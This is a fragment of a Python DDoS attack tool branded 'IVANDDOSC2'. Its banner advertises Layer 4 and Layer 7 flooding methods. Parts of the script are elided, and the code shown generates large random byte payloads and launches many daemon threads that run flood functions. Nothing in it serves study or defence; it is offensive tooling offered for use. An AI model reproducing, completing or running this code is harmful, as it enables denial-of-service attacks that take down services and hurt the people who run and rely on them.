...
print("╔═══════════════════════════════════════════════╗")
print("║     DDOS TOOLS IVANDDOSC2 L4 AND L7          ║")
print("║     DDOS L7 & L4 Methods VIP V2               ║")
print("║     Perintah Serangan Spamming Dilarang Keras!!!!!!         ║")
print("║     Pertama Soucre & Tool DDOS INBOX              ║")
print("╚═══════════════════════════════════════════════╝")
print("")
print("   ╔════════════════════════════════════════╗")
print("       @COPYRIGHT BY IVANDDOSC2")
print("   ╚════════════════════════════════════════╝")
print("")
print("[+] SOURCE DESIGN BY IVANDDOSC2 DEVELOPER     ")
...
def ddos():
    ...
    data3 = random._urandom(450179)
    data4 = random._urandom(550179)
    data5 = random._urandom(650179)
    data6 = random._urandom(750179)
    data7 = random._urandom(850179)
    data8 = random._urandom(950179)
...
for y in range(threads):
    ...
    th.start()
    th = threading.Thread(target = ddos1,daemon=True)
    th.start()
